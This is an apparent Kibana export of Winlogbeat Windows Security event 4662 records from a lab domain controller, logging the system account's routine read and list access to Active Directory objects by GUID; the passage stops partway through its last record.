"May 28, 2026 @ 20:58:11.064"	"zhC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109691	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.064"	"zRC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109690	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.064"	"zBC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{67212414-7bcc-4609-87e0-088dad8abdee}
	Object Name:		%{86fd1a02-26cc-4653-85f6-37709e8229a2}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{67212414-7bcc-4609-87e0-088dad8abdee}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{bf967a70-0de6-11d0-a285-00aa003049e2}
			{d7d5e8c1-e61f-464f-9fcf-20bbe0a2ec54}
			{90b769ac-4413-43cf-ad7a-867142e740a3}
			{86b9a69e-f0a6-405d-99bb-77d977992c2a}
			{250a8f20-f6fc-4559-ae65-e4b24c67aebe}
			{5cf0bcc8-60f7-4bff-bda6-aea0344eb151}
			{9ad33fc9-aacf-4299-bb3e-d1fc6ea88e49}
			{03726ae7-8e7d-4446-8aae-a91657c00993}
			{d6d67084-c720-417d-8647-b696237a114c}
			{1035a8e1-67a8-4c21-b7bb-031cdf99d7a0}
			{51928e94-2cd8-4abe-b552-e50412444370}
			{5ac48021-e447-46e7-9d23-92c0c6a90dfb}
			{db7a08e7-fc76-4569-a45f-f5ecb66a88b5}
			{4c5d607a-ce49-444a-9862-82a95f5d1fcc}
			{2ab0e48d-ac4e-4afc-83e5-a34240db6198}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{86fd1a02-26cc-4653-85f6-37709e8229a2}"	DS	"%{67212414-7bcc-4609-87e0-088dad8abdee}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{67212414-7bcc-4609-87e0-088dad8abdee}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{bf967a70-0de6-11d0-a285-00aa003049e2}
			{d7d5e8c1-e61f-464f-9fcf-20bbe0a2ec54}
			{90b769ac-4413-43cf-ad7a-867142e740a3}
			{86b9a69e-f0a6-405d-99bb-77d977992c2a}
			{250a8f20-f6fc-4559-ae65-e4b24c67aebe}
			{5cf0bcc8-60f7-4bff-bda6-aea0344eb151}
			{9ad33fc9-aacf-4299-bb3e-d1fc6ea88e49}
			{03726ae7-8e7d-4446-8aae-a91657c00993}
			{d6d67084-c720-417d-8647-b696237a114c}
			{1035a8e1-67a8-4c21-b7bb-031cdf99d7a0}
			{51928e94-2cd8-4abe-b552-e50412444370}
			{5ac48021-e447-46e7-9d23-92c0c6a90dfb}
			{db7a08e7-fc76-4569-a45f-f5ecb66a88b5}
			{4c5d607a-ce49-444a-9862-82a95f5d1fcc}
			{2ab0e48d-ac4e-4afc-83e5-a34240db6198}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109685	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.064"	"yxC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{e11505d7-92c4-43e7-bf5c-295832ffc896}
	Object Name:		%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{e11505d7-92c4-43e7-bf5c-295832ffc896}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}"	DS	"%{e11505d7-92c4-43e7-bf5c-295832ffc896}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{e11505d7-92c4-43e7-bf5c-295832ffc896}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109684	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.064"	"yhC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{67212414-7bcc-4609-87e0-088dad8abdee}
	Object Name:		%{86fd1a02-26cc-4653-85f6-37709e8229a2}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{67212414-7bcc-4609-87e0-088dad8abdee}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{86fd1a02-26cc-4653-85f6-37709e8229a2}"	DS	"%{67212414-7bcc-4609-87e0-088dad8abdee}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{67212414-7bcc-4609-87e0-088dad8abdee}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109683	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.064"	"yRC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{e11505d7-92c4-43e7-bf5c-295832ffc896}
	Object Name:		%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{261337aa-f1c3-44b2-bbea-c88d49e6f0c7}
	{e11505d7-92c4-43e7-bf5c-295832ffc896}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}"	DS	"%{e11505d7-92c4-43e7-bf5c-295832ffc896}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{261337aa-f1c3-44b2-bbea-c88d49e6f0c7}
	{e11505d7-92c4-43e7-bf5c-295832ffc896}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109678	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.064"	"yBC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{fa85c591-197f-477e-83bd-ea5a43df2239}
	Object Name:		%{b706fd49-0590-405c-b23f-08c74bdfc87a}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{fa85c591-197f-477e-83bd-ea5a43df2239}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{b706fd49-0590-405c-b23f-08c74bdfc87a}"	DS	"%{fa85c591-197f-477e-83bd-ea5a43df2239}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{fa85c591-197f-477e-83bd-ea5a43df2239}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109677	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.064"	"xxC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{e11505d7-92c4-43e7-bf5c-295832ffc896}
	Object Name:		%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{e11505d7-92c4-43e7-bf5c-295832ffc896}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}"	DS	"%{e11505d7-92c4-43e7-bf5c-295832ffc896}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{e11505d7-92c4-43e7-bf5c-295832ffc896}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109676	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.063"	"xhC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{fa85c591-197f-477e-83bd-ea5a43df2239}
	Object Name:		%{b706fd49-0590-405c-b23f-08c74bdfc87a}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{fa85c591-197f-477e-83bd-ea5a43df2239}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{1a861408-38c3-49ea-ba75-85481a77c655}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{b706fd49-0590-405c-b23f-08c74bdfc87a}"	DS	"%{fa85c591-197f-477e-83bd-ea5a43df2239}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{fa85c591-197f-477e-83bd-ea5a43df2239}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{1a861408-38c3-49ea-ba75-85481a77c655}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109671	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.063"	"xRC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109670	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.063"	"xBC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{fa85c591-197f-477e-83bd-ea5a43df2239}
	Object Name:		%{b706fd49-0590-405c-b23f-08c74bdfc87a}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{fa85c591-197f-477e-83bd-ea5a43df2239}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{b706fd49-0590-405c-b23f-08c74bdfc87a}"	DS	"%{fa85c591-197f-477e-83bd-ea5a43df2239}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{fa85c591-197f-477e-83bd-ea5a43df2239}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109669	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.063"	"wxC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
